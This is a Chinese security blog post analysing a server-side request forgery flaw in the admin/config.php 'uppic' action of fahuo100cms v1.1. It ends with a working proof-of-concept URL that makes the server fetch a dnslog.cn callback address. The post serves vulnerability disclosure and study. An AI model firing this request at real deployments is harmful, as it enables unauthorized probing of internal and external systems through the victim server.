#  发货100cms存在SSRF漏洞分析   
原创 猫鼠信安  猫鼠信安   2024-12-02 01:51  
  
- ## 注：仅供安全研究与学习之用，若将工具做其他用途，由使用者承担全部法律及连带责任，作者及发布者不承担任何法律及连带责任。  
<table><tbody><tr style="-webkit-tap-highlight-color: transparent;outline: 0px;visibility: visible;"><td data-colwidth="557" width="557" valign="top" style="-webkit-tap-highlight-color: transparent;outline: 0px;word-break: break-all;hyphens: auto;visibility: visible;"><p style="-webkit-tap-highlight-color: transparent;margin-top: 8px;margin-bottom: 8px;outline: 0px;visibility: visible;"><span style="-webkit-tap-highlight-color: transparent;outline: 0px;font-size: 14px;visibility: visible;"><span style="-webkit-tap-highlight-color: transparent;outline: 0px;color: rgb(217, 33, 66);visibility: visible;"><strong style="-webkit-tap-highlight-color: transparent;outline: 0px;visibility: visible;"><span leaf="">声明：</span></strong></span><span leaf="">该公众号分享的安全工具和项目均来源于网络，仅供安全研究与学习之用，如用于其他用途，由使用者承担全部法律及连带责任，与工具作者和本公众号无关。</span></span></p></td></tr></tbody></table>  
  
现在只对常读和星标的公众号才展示大图推送，建议大家把  
猫鼠信安  
“  
设为星标  
”，  
否则可能看不到了  
！  
  
-   
厂商官网：https://www.fahuo100.cn/  
  
![](https://mmbiz.qpic.cn/mmbiz_png/dZ5pDwTw55v8gQBapfa8T80cDC4zv8Mt0K4S0QhI0EG19g1ib4HBibBbNrT4ZFDomIF7D1V7xFCIHshDqQdBeY1g/640?wx_fmt=png&from=appmsg "")  
  
下载最新版本即可。  
  
影响版本：  
v1.1_build20240803  
  
漏洞分析：  
  
涉及到的文件：admin/config.php  
  
1、  
当action等于uppic时，使用get的方式传参，并把file的值传到file变量，此后再进入if(tooss($file))进行判断  
  
![](https://mmbiz.qpic.cn/mmbiz_png/dZ5pDwTw55v8gQBapfa8T80cDC4zv8MtobcO0hSfbwNcnJibCNpKib2wKodulh3POp1FJzSBWpnQicicZrNTsMDZ3A/640?wx_fmt=png&from=appmsg "")  
  
跟进tooss方法可以看到上述的值传递到tooss方法中， 并传递到if判断语句中的  
file_get_contents  
，直接导致ssrf漏洞产生  
  
![](https://mmbiz.qpic.cn/mmbiz_png/dZ5pDwTw55v8gQBapfa8T80cDC4zv8MtIf5MXJtuC3xiaOWkcu8HwpiaYNrDYwedZ5JLzKjohs02onK6n5HNvyVw/640?wx_fmt=png&from=appmsg "")  
  
漏洞复现：  
  
  
根据上述分析代码，直接拼接语句  
  
http:// 127.0.0.1:82/admin/config.php?action=uppic&file=你的payload  
  
漏洞url为：  
  
http://127.0.0.1:82/admin/config.php?action=uppic&file=http://mazqd8.dnslog.cn  
  
登录系统的状态下访问漏洞url  
  
![](https://mmbiz.qpic.cn/mmbiz_png/dZ5pDwTw55v8gQBapfa8T80cDC4zv8Mtjicic8KicLcxSj2AkSApBNbKsk6F8VCiadOEPul6UAQPmibia6phuFj6ibLSg/640?wx_fmt=png&from=appmsg "")  
  
  
   
  
可以看到外带回显成功，证明存在ssrf  
  
![](https://mmbiz.qpic.cn/mmbiz_png/dZ5pDwTw55v8gQBapfa8T80cDC4zv8MtxOBTkBPjOPBxuFficO5k479EynBOvKHibo4wib7eGfZ19E9DKNdk0EZgg/640?wx_fmt=png&from=appmsg "")  
  
  
## 点击下方名片进入公众号  
  
  
  
